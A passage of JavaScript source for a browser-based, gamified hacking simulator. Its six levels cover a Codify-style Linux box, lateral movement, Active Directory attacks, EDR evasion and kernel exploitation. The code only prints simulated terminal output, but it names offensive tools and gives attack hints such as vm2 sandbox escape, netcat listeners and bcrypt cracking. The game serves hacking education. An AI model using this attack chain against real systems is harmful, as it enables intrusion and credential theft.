  print('║  LEVEL PROGRESS:                                          ║', 'info');
  LEVELS.forEach(level => {
    const completed = gameState.levelsCompleted.includes(level.id);
    const status = completed ? '[✓]' : (gameState.currentLevel === level.id ? '[>]' : '[ ]');
    const color = completed ? 'success' : (gameState.currentLevel === level.id ? 'warning' : 'system');
    print(`║    ${status} Level ${level.id}: ${level.name.padEnd(38)} ║`, color);
  });

  print('╠═══════════════════════════════════════════════════════════╣', 'info');

  // Show easter egg hints
  print('║  EASTER EGGS:                                             ║', 'info');
  Object.entries(EASTER_EGG_NAMES).forEach(([eggId, egg]) => {
    const found = gameState.easterEggsFound.includes(eggId);
    const levelStr = egg.level === 0 ? 'Secret' : `Lvl ${egg.level}`;
    const hint = found ? '✓ FOUND!' : egg.hint;
    print(`║    [${levelStr.padEnd(6)}] ${hint.padEnd(42)} ║`, found ? 'success' : 'system');
  });

  print('╚═══════════════════════════════════════════════════════════╝', 'info');
  print('');

  // Special message for completing everything
  if (gameState.levelsCompleted.length === 6 && gameState.easterEggsFound.length >= 6) {
    print(ASCII.pwned, 'ascii');
    print('*** CONGRATULATIONS! You are a TRUE HACKER! ***', 'highlight');
    print('You have completed all levels and found all easter eggs!', 'success');
    print('');
  }
}

// ============================================
// TERMINAL OUTPUT
// ============================================
const output = document.getElementById('terminal-output');
const input = document.getElementById('terminal-input');
const prompt = document.getElementById('prompt');
const autocomplete = document.getElementById('autocomplete');
const hud = document.getElementById('hud');
const levelSelect = document.getElementById('level-select');

function print(text, className = '') {
  const line = document.createElement('div');
  line.className = 'output-line ' + className;
  line.textContent = text;
  output.appendChild(line);
  output.scrollTop = output.scrollHeight;
}

function printHTML(html) {
  const line = document.createElement('div');
  line.className = 'output-line';
  line.innerHTML = html;
  output.appendChild(line);
  output.scrollTop = output.scrollHeight;
}

function clear() {
  output.innerHTML = '';
}

async function typeText(text, delay = 30, className = '') {
  const line = document.createElement('div');
  line.className = 'output-line ' + className;
  output.appendChild(line);

  for (let i = 0; i < text.length; i++) {
    line.textContent += text[i];
    output.scrollTop = output.scrollHeight;
    if (text[i] !== ' ') playKeyPress();
    await sleep(delay);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function simulateLoading(text, duration = 2000) {
  const line = document.createElement('div');
  line.className = 'output-line';
  output.appendChild(line);

  const frames = ['|', '/', '-', '\\'];
  let i = 0;
  const start = Date.now();

  while (Date.now() - start < duration) {
    line.textContent = text + ' ' + frames[i % 4];
    i++;
    await sleep(100);
  }
  line.textContent = text + ' done';
}

// ============================================
// ASCII ART
// ============================================
const ASCII = {
  title: `
  ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███
  ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
  ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
  ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄
  ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
   ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░     ░░   ░
   ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░
`,
  skull: `
      _______________
     /               \\
    |  RIP FIREWALL  |
    |    2024-2024   |
    |_________________|
          |   |
         _|   |_
        |       |
`,
  server: `
    +------------------+
    |  [====]  SYSTEM  |
    |  [====]  ONLINE  |
    |  [    ]          |
    |  [====]  |||     |
    +------------------+
`,
  key: `
       _______
      /       \\
     | O     O |
      \\_______/
          |
       ___|___
      |   |   |
      |___|___|
`,
  crown: `
        ___
    .-\"\"   \"\"-.
   /   o   o   \\
  |      ^      |
   \\  \\-----/  /
    '-._____.-'
`,
  edr: `
    +=====================+
    |  [!] EDR ACTIVE [!] |
    |  Monitoring: ON     |
    |  Hooks: ENABLED     |
    |  Alerts: 0          |
    +=====================+
`,
  kernel: `
     _____________
    |  RING  0    |
    |  =========  |
    | |  KERNEL | |
    | |_________| |
    |  [DANGER]   |
    |_____________|
`,
  temple: `
         /\\
        /  \\
       / || \\
      /  ||  \\
     /   ||   \\
    /____||____\\
    |    ||    |
    | TEMPLE OS |
    |___________|
`,
  skibidi: `
       ╭━━━━━━━╮
       ┃ ⊙ _ ⊙ ┃
       ╰┳━━━━┳╯
     ╭━━┻━━━━┻━━╮
     ┃  SKIBIDI ┃
     ┃  TOILET  ┃
     ╰━━━┳┳━━━━╯
         ┃┃
    ━━━━━┻┻━━━━━
`,
  ohio: `
    ╔═══════════════════╗
    ║  ONLY IN OHIO...  ║
    ║                   ║
    ║   ┌─────────┐     ║
    ║   │ ◉ ︵ ◉ │     ║
    ║   │  ╭───╮  │     ║
    ║   │  │OH │  │     ║
    ║   └──┴───┴──┘     ║
    ╚═══════════════════╝
`,
  sigma: `
    ┏━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃   SIGMA GRINDSET      ┃
    ┃  ╭─────────────────╮  ┃
    ┃  │                 │  ┃
    ┃  │    - ━━ -       │  ┃
    ┃  │      ┃┃┃        │  ┃
    ┃  │     ━━━━━       │  ┃
    ┃  ╰─────────────────╯  ┃
    ┃  "I AM THE STORM"     ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━┛
`,
  mewing: `
      ╭━━━━━━━━━━━━━╮
      ┃   MEWING   ┃
      ╰━━━━━━━━━━━━━╯
         ╭──────╮
        / @    @ \\
       │    ▽    │
       │  ━━━━━  │  <- tongue on roof
        \\______/
          ║  ║
         LOOKSMAX
`,
  rizz: `
    ╔═══════════════════════╗
    ║   +1000 AURA POINTS   ║
    ║                       ║
    ║      W  RIZZ  W       ║
    ║                       ║
    ║   ╭───────────────╮   ║
    ║   │   ( . Y . )   │   ║
    ║   ╰───────────────╯   ║
    ╚═══════════════════════╝
`,
  fanum: `
    ╭━━━━━━━━━━━━━━━━━━━╮
    ┃   FANUM TAX'D!    ┃
    ┃                   ┃
    ┃    ╭─────────╮    ┃
    ┃    │  ~ w ~  │    ┃
    ┃    │  \\    / │    ┃
    ┃    │   \\__/  │    ┃
    ┃    ╰─────────╯    ┃
    ┃  your creds? MINE ┃
    ╰━━━━━━━━━━━━━━━━━━━╯
`,
  gyatt: `
     ██████╗ ██╗   ██╗ █████╗ ████████╗████████╗
    ██╔════╝ ╚██╗ ██╔╝██╔══██╗╚══██╔══╝╚══██╔══╝
    ██║  ███╗ ╚████╔╝ ███████║   ██║      ██║
    ██║   ██║  ╚██╔╝  ██╔══██║   ██║      ██║
    ╚██████╔╝   ██║   ██║  ██║   ██║      ██║
     ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝
`,
  edging: `
    ╭━━━━━━━━━━━━━━━━━━━━━╮
    ┃  EDGING THE EDR... ┃
    ┃                    ┃
    ┃   [████████░░] 80% ┃
    ┃                    ┃
    ┃   so close...      ┃
    ╰━━━━━━━━━━━━━━━━━━━━━╯
`,
  hacker2: `
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █ ▄▄▄▄▄ █▄ ▄▄▄█▀ ▀███▀▄▀█ ▄▄▄▄▄ █
   █ █   █ █▀▄███▀▀▄█ ▀█▀▄██ █   █ █
   █ █▄▄▄█ █▄▀▀█▄▄█ █▄█ ███ █▄▄▄█ █
   █▄▄▄▄▄▄▄█▄▀▄█▄█ ▀▄▀▄█ █▄▄▄▄▄▄▄█
   █▄ ▀▀ █▄▄▀▄▄▀▄▄▀ █▀▀▀█▀▀█▀▄▀ ▄█
    [ACCESS GRANTED]
`,
  access: `
    ╔═══════════════════════════════════════╗
    ║     █████╗  ██████╗ ██████╗███████╗   ║
    ║    ██╔══██╗██╔════╝██╔════╝██╔════╝   ║
    ║    ███████║██║     ██║     █████╗     ║
    ║    ██╔══██║██║     ██║     ██╔══╝     ║
    ║    ██║  ██║╚██████╗╚██████╗███████╗   ║
    ║    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝   ║
    ║          G R A N T E D                ║
    ╚═══════════════════════════════════════╝
`,
  locked: `
    ╔═════════════════════════════╗
    ║         .-"""-.            ║
    ║        /        \\          ║
    ║       |  O    O  |          ║
    ║       |    __    |          ║
    ║        \\  \\__/  /          ║
    ║         '------'            ║
    ║      ┌──────────┐          ║
    ║      │ LOCKED   │          ║
    ║      │▓▓▓▓▓▓▓▓▓▓│          ║
    ║      └──────────┘          ║
    ╚═════════════════════════════╝
`,
  matrix: `
    ╔══════════════════════════════════════╗
    ║  01001000 01000001 01000011 01001011 ║
    ║  ░▒▓█▓▒░ THE MATRIX HAS YOU ░▒▓█▓▒░ ║
    ║  Follow the white rabbit...          ║
    ╚══════════════════════════════════════╝
`,
  pwned: `
     ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
     ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
     ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
     ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝
`
};

// ============================================
// COOL ANIMATIONS
// ============================================
async function matrixRain(duration = 3000) {
  const chars = '01アイウエオカキクケコサシスセソタチツテト';
  const columns = 50;
  const lines = [];

  for (let i = 0; i < 8; i++) {
    let line = '';
    for (let j = 0; j < columns; j++) {
      line += chars[Math.floor(Math.random() * chars.length)];
    }
    lines.push(line);
  }

  const container = document.createElement('div');
  container.className = 'output-line ascii';
  container.style.color = '#00ff00';
  container.style.textShadow = '0 0 5px #00ff00';
  output.appendChild(container);

  const start = Date.now();
  while (Date.now() - start < duration) {
    let display = '';
    for (let i = 0; i < lines.length; i++) {
      // Shift each line
      lines[i] = chars[Math.floor(Math.random() * chars.length)] + lines[i].slice(0, -1);
      display += lines[i] + '\n';
    }
    container.textContent = display;
    output.scrollTop = output.scrollHeight;
    await sleep(50);
  }
  container.remove();
}

async function glitchText(text, iterations = 5) {
  const glitchChars = '!@#$%^&*()_+-=[]{}|;:,.<>?░▒▓█';
  const line = document.createElement('div');
  line.className = 'output-line highlight';
  output.appendChild(line);

  for (let i = 0; i < iterations; i++) {
    let glitched = '';
    for (let j = 0; j < text.length; j++) {
      if (Math.random() < 0.3) {
        glitched += glitchChars[Math.floor(Math.random() * glitchChars.length)];
      } else {
        glitched += text[j];
      }
    }
    line.textContent = glitched;
    await sleep(100);
  }
  line.textContent = text;
  return line;
}

async function typewriterEffect(text, speed = 50, className = '') {
  const line = document.createElement('div');
  line.className = 'output-line ' + className;
  output.appendChild(line);

  for (let i = 0; i <= text.length; i++) {
    line.textContent = text.substring(0, i) + (i < text.length ? '█' : '');
    output.scrollTop = output.scrollHeight;
    if (soundEnabled) playKeyPress();
    await sleep(speed);
  }
  line.textContent = text;
}

// ============================================
// LEVEL DEFINITIONS
// ============================================
const LEVELS = [
  {
    id: 1,
    name: "Foothold",
    subtitle: "HTB Easy - Codify",
    description: "A Node.js sandbox escape leads to initial access. Enumerate, find the vulnerability, and escalate.",
    target: "10.10.11.239",
    objective: "Obtain root flag",
    commands: [
      'help', 'hint', 'status', 'nmap', 'gobuster', 'feroxbuster', 'ffuf', 'curl', 'wget',
      'nc', 'ssh', 'cat', 'ls', 'id', 'whoami', 'pwd', 'cd', 'find', 'grep', 'sudo',
      'linpeas', 'pspy', 'strings', 'file', 'python3', 'bash', 'su', 'exit'
    ],
    init: initLevel1,
    handleCommand: handleLevel1Command
  },
  {
    id: 2,
    name: "Hacker",
    subtitle: "Lateral Movement",
    description: "Pivot through the network. Crack hashes. Move laterally.",
    target: "CORP-DC01",
    objective: "Compromise domain user",
    commands: ['help', 'hint', 'status', 'nmap', 'smbclient', 'hashcat', 'crackmapexec', 'evil-winrm', 'cat', 'ls', 'whoami', 'get', 'exit'],
    init: initLevel2,
    handleCommand: handleLevel2Command
  },
  {
    id: 3,
    name: "Elite Hacker",
    subtitle: "Active Directory Assault",
    description: "Full AD attack chain. Kerberoast. Pass-the-hash. Own the domain.",
    target: "MEGACORP.LOCAL",
    objective: "Domain Admin",
    commands: ['help', 'hint', 'status', 'bloodhound', 'bloodhound-python', 'rubeus', 'mimikatz', 'impacket-secretsdump', 'impacket-psexec', 'net', 'cat', 'ls', 'exit'],
    init: initLevel3,
    handleCommand: handleLevel3Command
  },
  {
    id: 4,
    name: "Expert EDR Evader",
    subtitle: "Ghost Protocol",
    description: "Evade endpoint detection. Unhook. Obfuscate. Stay invisible.",
    target: "SECURE-WKS01",
    objective: "Execute payload undetected",
    commands: ['help', 'hint', 'scan', 'unhook', 'obfuscate', 'inject', 'hollow', 'execute', 'status', 'tasklist', 'exit'],
    init: initLevel4,
    handleCommand: handleLevel4Command
  },
  {
    id: 5,
    name: "Kernel Exploiter",
    subtitle: "Ring Zero",
    description: "Analyze the driver. Find the bug. Write the exploit. Own the kernel.",
    target: "vulndrv.sys",
    objective: "SYSTEM via kernel exploit",
    commands: ['help', 'hint', 'analyze', 'disasm', 'ioctl', 'alloc', 'write', 'trigger', 'status', '!analyze', 'lm', 'exit'],
    init: initLevel5,
    handleCommand: handleLevel5Command
  },
  {
    id: 6,
    name: "HolyC Writer",
    subtitle: "Divine Computation",
    description: "Write HolyC. Speak to God. Transcend the machine.",
    target: "TempleOS",
    objective: "Divine enlightenment",
    commands: ['help', 'hint', 'status', 'holyc', 'compile', 'run', 'pray', 'speak', 'transcend', 'godsays', 'GodSays', 'exit'],
    init: initLevel6,
    handleCommand: handleLevel6Command
  }
];

// ============================================
// MAIN MENU
// ============================================
async function showMainMenu() {
  // Don't reset levelState when going to menu - preserve it for continue
  gameState.inLevel = false;
  hud.style.display = 'none';
  levelSelect.style.display = 'none';
  clear();

  playBoot();

  for (const line of ASCII.title.split('\n')) {
    print(line, 'ascii');
    await sleep(50);
  }

  print('');

  // Check if we need hacker name
  if (gameState.needsName) {
    await typeText('// Enter your hacker name to begin...', 20, 'warning');
    print('Type your name and press Enter:', 'info');
    prompt.textContent = 'name>';
    return;
  }

  await typeText(`// Welcome back, ${gameState.hackerName}`, 20, 'success');
  await typeText('// Terminal-based hacking simulation', 20, 'system');
  await typeText('// 6 levels of increasing difficulty', 20, 'system');
  await typeText('// Type commands. Own systems. Level up.', 20, 'system');
  print('');
  print('Commands:', 'info');

  // Show continue if there's a level in progress
  const hasProgress = gameState.currentLevel > 0 && Object.keys(gameState.levelState).length > 0 &&
                     !gameState.levelsCompleted.includes(gameState.currentLevel);
  if (hasProgress) {
    print(`  continue - Resume Level ${gameState.currentLevel}`, 'success');
  }

  print('  start    - Begin from first incomplete level', 'system');
  print('  levels   - Select a level', 'system');
  print('  stats    - View your progress and score', 'system');
  print('  reset    - Delete all progress', 'system');
  print('  help     - Show this message', 'system');
  print('');

  const completed = gameState.levelsCompleted.length;
  if (completed > 0) {
    print(`Progress: ${completed}/6 levels completed`, 'success');
  }
  print(`Total attempts: ${gameState.attempts}`, 'system');

  prompt.textContent = '>';
}

function showLevelSelect() {
  levelSelect.style.display = 'block';
  output.style.display = 'none';

  levelSelect.innerHTML = '<div style="margin-bottom:20px;"><span style="color:#b5e853;font-family:Monaco,monospace;">SELECT LEVEL</span> <span style="color:#555;font-size:12px;">(press ESC to go back)</span></div>';

  LEVELS.forEach((level, idx) => {
    const isCompleted = gameState.levelsCompleted.includes(level.id);
    const isUnlocked = idx === 0 || gameState.levelsCompleted.includes(LEVELS[idx - 1].id);

    const card = document.createElement('div');
    card.className = 'level-card' + (isCompleted ? ' completed' : '') + (!isUnlocked ? ' locked' : '');
    card.innerHTML = `
      <div class="level-num">${level.id}</div>
      <div class="level-info">
        <div class="level-name">${level.name} <span style="color:#555;font-size:12px;">— ${level.subtitle}</span></div>
        <div class="level-desc">${level.description}</div>
      </div>
      <div class="level-status ${isCompleted ? 'completed' : (isUnlocked ? 'unlocked' : 'locked')}">
        ${isCompleted ? 'COMPLETED' : (isUnlocked ? 'UNLOCKED' : 'LOCKED')}
      </div>
    `;

    if (isUnlocked) {
      card.onclick = () => {
        // Check if this is the current level with progress
        const hasProgress = gameState.currentLevel === level.id &&
                           Object.keys(gameState.levelState).length > 0;
        startLevel(level.id, hasProgress);
      };
    }

    levelSelect.appendChild(card);
  });
}

function hideLevelSelect() {
  levelSelect.style.display = 'none';
  output.style.display = 'block';
}

// ============================================
// START LEVEL
// ============================================
async function startLevel(levelId, continueLevel = false) {
  const level = LEVELS.find(l => l.id === levelId);
  if (!level) return;

  hideLevelSelect();
  clear();
  gameState.currentLevel = levelId;
  gameState.inLevel = true;

  // Only reset state if NOT continuing
  if (!continueLevel) {
    gameState.levelState = {};
    gameState.attempts++;
    saveGame();
  }

  // Update HUD
  hud.style.display = 'block';
  document.getElementById('hud-level').textContent = `${level.id}: ${level.name}`;
  document.getElementById('hud-target').textContent = level.target;
  document.getElementById('hud-objective').textContent = level.objective;

  // Update prompt
  prompt.textContent = 'root@kali:~#';

  playBoot();

  print(`========================================`, 'system');
  print(`  LEVEL ${level.id}: ${level.name.toUpperCase()}`, 'highlight');
  print(`  "${level.subtitle}"`, 'system');
  print(`========================================`, 'system');
  print('');
  print(`TARGET: ${level.target}`, 'info');
  print(`OBJECTIVE: ${level.objective}`, 'warning');
  print('');

  if (continueLevel) {
    print('[Resuming from saved progress...]', 'success');
    print('');
    // Show current state
    const stateKeys = Object.entries(gameState.levelState).filter(([k, v]) => v === true);
    if (stateKeys.length > 0) {
      print('Progress restored:', 'info');
      stateKeys.forEach(([k]) => print(`  - ${k}`, 'system'));
      print('');
    }
  }

  print('Type "help" for available commands.', 'system');
  print('');

  // Only initialize level state if NOT continuing
  if (!continueLevel) {
    await level.init();
  }
}

function completeLevel() {
  const level = LEVELS.find(l => l.id === gameState.currentLevel);
  if (!level) return;

  if (!gameState.levelsCompleted.includes(level.id)) {
    gameState.levelsCompleted.push(level.id);
    saveGame();
  }

  playSuccess();

  // Level completion art (brainrot ASCII, normal messages)
  const levelMemes = {
    1: { art: 'skibidi', msg: 'First shell acquired. Welcome to the game.' },
    2: { art: 'fanum', msg: 'Lateral movement complete. Network compromised.' },
    3: { art: 'sigma', msg: 'Domain Admin achieved. The network is yours.' },
    4: { art: 'edging', msg: 'EDR bypassed. Ghost mode activated.' },
    5: { art: 'gyatt', msg: 'Ring 0 access. You own the kernel.' },
    6: { art: 'rizz', msg: 'Transcendence complete. You are one with the machine.' }
  };

  const meme = levelMemes[level.id];

  print('');
  print('========================================', 'success');
  print(`  LEVEL ${level.id} COMPLETE!`, 'success');
  print('========================================', 'success');
  print('');

  if (meme) {
    print(ASCII[meme.art], 'ascii');
    print('');
    print(meme.msg, 'highlight');
    print('');
  }

  // Random hacker quotes
  const bonusMessages = [
    '"The quieter you become, the more you can hear." - BackTrack',
    '"rm -rf / their security" - Anonymous',
    '"sudo make me a sandwich" - xkcd',
    '"There is no patch for human stupidity." - Kevin Mitnick',
    '"Hackers are breaking the systems for profit. Before, it was about intellectual curiosity." - Kevin Mitnick',
    '"In the digital age, privacy must be a priority." - Al Gore',
    '"The only secure computer is one that\'s unplugged." - Security Proverb',
    '"Trust no one. Verify everything." - Zero Trust'
  ];
  print(bonusMessages[Math.floor(Math.random() * bonusMessages.length)], 'system');
  print('');

  if (level.id < 6) {
    print('Type "next" to continue or "menu" to return.', 'system');
  } else {
    print('You have completed all levels.', 'highlight');
    print('You are now a true hacker.', 'highlight');
    print('');
    print('Type "menu" to return.', 'system');
  }
}

// ============================================
// LEVEL 1: FOOTHOLD (HTB Easy - Codify Style)
// ============================================
async function initLevel1() {
  gameState.levelState = {
    // Enumeration phase
    scanned: false,
    foundWeb: false,
    foundEditor: false,
    // Exploitation phase
    triedPayloads: 0,
    gotShell: false,
    shellUser: '',
    currentDir: '/home/svc',
    // Post-exploitation
    foundTickets: false,
    foundDb: false,
    extractedHash: false,
    crackedPassword: false,
    foundScript: false,
    analyzedScript: false,
    gotRoot: false,
    // Flags
    userFlag: false,
    rootFlag: false
  };

  print('');
  print('┌────────────────────────────────────────────────────────────────┐', 'info');
  print('│  MACHINE: Codify                                               │', 'info');
  print('│  DIFFICULTY: Easy                                              │', 'success');
  print('├────────────────────────────────────────────────────────────────┤', 'info');
  print('│  TARGET:    10.10.11.239                                       │', 'system');
  print('│  OS:        Linux (Ubuntu 22.04)                               │', 'system');
  print('│  SERVICES:  Unknown - Enumerate!                               │', 'warning');
  print('├────────────────────────────────────────────────────────────────┤', 'info');
  print('│  OBJECTIVE: Obtain user.txt and root.txt                       │', 'warning');
  print('└────────────────────────────────────────────────────────────────┘', 'info');
  print('');
  await typeText('[BRIEFING] A development server with a code testing service.', 30, 'info');
  await typeText('[BRIEFING] Find the vulnerability. Escape the sandbox.', 30, 'info');
  await typeText('[BRIEFING] Enumerate. Escalate. Own the box.', 30, 'warning');
  print('');
  print('Type "help" for available commands.', 'system');
}

async function handleLevel1Command(cmd, args) {
  const state = gameState.levelState;
  const fullCmd = args.length > 0 ? cmd + ' ' + args.join(' ') : cmd;

  // === HELP ===
  if (cmd === 'help') {
    print('');
    print('┌────────────────────────────────────────────────────────────────┐', 'info');
    print('│                    AVAILABLE COMMANDS                          │', 'info');
    print('├────────────────────────────────────────────────────────────────┤', 'info');
    print('│  ENUMERATION:                                                  │', 'info');
    print('│    nmap -sC -sV <ip>       Service/version scan               │', 'system');
    print('│    nmap -p- <ip>           Full port scan                     │', 'system');
    print('│    gobuster dir -u <url>   Directory bruteforce               │', 'system');
    print('│    ffuf -u <url>/FUZZ      Fuzzing with ffuf                  │', 'system');
    print('│    curl <url>              HTTP requests                      │', 'system');
    print('│                                                                │', 'info');
    print('│  EXPLOITATION:                                                 │', 'info');
    print('│    nc -lvnp <port>         Start listener                     │', 'system');
    print('│    curl -X POST -d "code=..." Send code to editor            │', 'system');
    print('│                                                                │', 'info');
    print('│  POST-EXPLOITATION:                                            │', 'info');
    print('│    ls [-la] [path]         List directory                     │', 'system');
    print('│    cat <file>              Read file                          │', 'system');
    print('│    cd <dir>                Change directory                   │', 'system');
    print('│    find <pattern>          Search for files                   │', 'system');
    print('│    grep <pattern> <file>   Search in file                     │', 'system');
    print('│    sudo -l                 Check sudo permissions             │', 'system');
    print('│    su <user>               Switch user                        │', 'system');
    print('│    id                      Show current user                  │', 'system');
    print('│                                                                │', 'info');
    print('│  TOOLS:                                                        │', 'info');
    print('│    linpeas                 Run LinPEAS                        │', 'system');
    print('│    sqlite3 <db>            Query SQLite database              │', 'system');
    print('│    hashcat -m <mode> <hash> Crack hashes                      │', 'system');
    print('│    python3 <script>        Run Python script                  │', 'system');
    print('│                                                                │', 'info');
    print('│  UTILITY:                                                      │', 'info');
    print('│    status                  Show progress                      │', 'success');
    print('│    hint                    Get contextual hint                │', 'warning');
    print('│    exit                    Return to menu                     │', 'system');
    print('└────────────────────────────────────────────────────────────────┘', 'info');
    return;
  }

  // === STATUS ===
  if (cmd === 'status') {
    print('');
    print('┌────────────────────────────────────────┐', 'info');
    print('│       LEVEL 1: CODIFY - STATUS         │', 'info');
    print('├────────────────────────────────────────┤', 'info');
    print('│  ENUMERATION:                          │', 'muted');
    print(`│    [${state.scanned ? 'x' : ' '}] Port scan completed         │`, state.scanned ? 'success' : 'system');
    print(`│    [${state.foundWeb ? 'x' : ' '}] Web application found       │`, state.foundWeb ? 'success' : 'system');
    print(`│    [${state.foundEditor ? 'x' : ' '}] Code editor discovered     │`, state.foundEditor ? 'success' : 'system');
    print('│  EXPLOITATION:                         │', 'muted');
    print(`│    [${state.gotShell ? 'x' : ' '}] Initial foothold            │`, state.gotShell ? 'success' : 'system');
    print(`│    [${state.userFlag ? 'x' : ' '}] User flag obtained          │`, state.userFlag ? 'success' : 'system');
    print('│  PRIVILEGE ESCALATION:                 │', 'muted');
    print(`│    [${state.foundDb ? 'x' : ' '}] Credentials found           │`, state.foundDb ? 'success' : 'system');
    print(`│    [${state.crackedPassword ? 'x' : ' '}] Password cracked           │`, state.crackedPassword ? 'success' : 'system');
    print(`│    [${state.gotRoot ? 'x' : ' '}] Root access                 │`, state.gotRoot ? 'success' : 'system');
    print(`│    [${state.rootFlag ? 'x' : ' '}] Root flag obtained          │`, state.rootFlag ? 'success' : 'system');
    print('└────────────────────────────────────────┘', 'info');
    return;
  }

  // === HINT ===
  if (cmd === 'hint') {
    print('');
    print('[*] CONTEXTUAL HINT:', 'warning');
    if (!state.scanned) {
      print('Start with port scanning to identify services.', 'info');
    } else if (!state.foundEditor) {
      print('Enumerate web directories on the discovered ports.', 'info');
    } else if (!state.gotShell) {
      print('The editor runs code in a sandbox. Research vm2 vulnerabilities.', 'info');
      print('You need to send POST requests to the /editor endpoint.', 'system');
    } else if (!state.foundDb) {
      print('Look for database files in the web application directories.', 'info');
    } else if (!state.crackedPassword) {
      print('Extract hashes from the database and crack them.', 'info');
      print('bcrypt uses hashcat mode 3200.', 'system');
    } else if (!state.gotRoot) {
      print('Check sudo permissions for joshua user.', 'info');
      print('Analyze any scripts that can be run as root.', 'system');
    } else {
      print('Read the root flag in /root/root.txt', 'success');
    }
    print('');
    return;
  }

  // === NMAP ===
  if (cmd === 'nmap') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Nmap 7.94 ( https://nmap.org )', 'info');
      print('Usage: nmap [Scan Type(s)] [Options] {target specification}', 'system');
      print('', '');
      print('TARGET SPECIFICATION:', 'info');
      print('  Can pass hostnames, IP addresses, networks, etc.', 'system');
      print('  Ex: scanme.nmap.org, 192.168.0.1; 10.0.0-255.1-254', 'system');
      print('', '');
      print('HOST DISCOVERY:', 'info');
      print('  -sn: Ping Scan - disable port scan', 'system');
      print('  -Pn: Treat all hosts as online -- skip host discovery', 'system');
      print('', '');
      print('SCAN TECHNIQUES:', 'info');
      print('  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans', 'system');
      print('  -sU: UDP Scan', 'system');
      print('  -sN/sF/sX: TCP Null, FIN, and Xmas scans', 'system');
      print('', '');
      print('PORT SPECIFICATION:', 'info');
      print('  -p <port ranges>: Only scan specified ports', 'system');
      print('    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9', 'system');
      print('  -p-: Scan all 65535 ports', 'system');
      print('', '');
      print('SERVICE/VERSION DETECTION:', 'info');
      print('  -sV: Probe open ports to determine service/version info', 'success');
      print('  -sC: equivalent to --script=default', 'success');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  nmap -sV -sC 10.10.11.239     # Service scan with scripts', 'system');
      print('  nmap -p- 10.10.11.239         # Full port scan', 'system');
      print('  nmap -sU -p 53,161 10.10.11.239  # UDP scan', 'system');
      print('', '');
      return;
    }

    // Validate: must have a target
    const target = args.find(a => a.match(/^[\d.]+$/));
    if (!target) {
      print('ERROR: No target specified.', 'error');
      print('', '');
      print('Usage: nmap [Scan Type(s)] [Options] <target>', 'system');
      print('       nmap --help for full options', 'system');
      print('', '');
      print('Example: nmap -sV -sC 10.10.11.239', 'info');
      return;
    }

    // Check if target is reachable
    if (target !== '10.10.11.239') {
      print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
      await simulateLoading('Scanning ' + target, 2000);
      print(`Note: Host ${target} seems down.`, 'warning');
      print('If it is really up, but blocking our ping probes, try -Pn', 'system');
      return;
    }

    const hasVersionScan = args.includes('-sV');
    const hasScripts = args.includes('-sC');
    const fullScan = args.includes('-p-');
    const hasUDP = args.includes('-sU');

    // Must have at least -sV or -sC for meaningful output
    if (!hasVersionScan && !hasScripts && !fullScan && !hasUDP) {
      print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
      await simulateLoading('Scanning ' + target, 1500);
      print('');
      print(`Nmap scan report for ${target}`, 'info');
      print('Host is up (0.045s latency).', 'system');
      print('Not shown: 997 closed tcp ports (reset)', 'muted');
      print('', '');
      print('PORT     STATE SERVICE', 'info');
      print('22/tcp   open  ssh', 'system');
      print('80/tcp   open  http', 'system');
      print('3000/tcp open  ppp', 'system');
      print('', '');
      print('[!] Basic scan completed. Use -sV -sC for version detection and scripts.', 'warning');
      state.scanned = true;
      autosave();
      return;
    }

    await simulateLoading('Scanning ' + target, fullScan ? 4500 : 3000);
    print('');
    print(`Starting Nmap 7.94 at ${new Date().toLocaleString()}`, 'system');
    print(`Nmap scan report for ${target} (codify.htb)`, 'info');
    print('Host is up (0.045s latency).', 'system');
    print('');

    if (fullScan) {
      print('PORT     STATE SERVICE  VERSION', 'info');
      print('22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)', 'system');
      print('| ssh-hostkey:', 'muted');
      print('|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)', 'muted');
      print('|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)', 'muted');
      print('80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))', 'system');
      print('|_http-title: Codify', 'system');
      print('|_http-server-header: Apache/2.4.52 (Ubuntu)', 'system');
      print('3000/tcp open  http     Node.js Express framework', 'success');
